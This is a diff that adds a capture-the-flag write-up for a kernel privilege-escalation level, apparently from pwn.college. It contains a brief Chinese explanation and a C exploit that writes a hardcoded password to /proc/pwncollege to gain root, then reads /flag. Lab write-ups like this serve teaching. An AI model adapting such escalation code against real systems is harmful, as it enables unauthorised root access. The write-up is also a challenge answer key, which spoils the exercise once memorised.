@@ -149,3 +149,40 @@ int main(int argc, char *argv[]) {
   return 0;
 }
 ```
+
+# Level 3.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Ease into kernel exploitation with another crackme level, this time with some privilege escalation (whoami?).
+
+## Write-up
+
+白给的提权函数，提权后再 `cat /flag` 就好了。
+
+## Exploit
+
+```c
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+char password[] = "tzrfzpifnzshksnp";
+
+int main(int argc, char *argv[]) {
+  int fd = open("/proc/pwncollege", O_WRONLY);
+
+  printf("Current UID: %d\n", getuid());
+  write(fd, password, strlen(password));
+  printf("Current UID: %d\n", getuid());
+  system("cat /flag");
+
+  return 0;
+}
+```
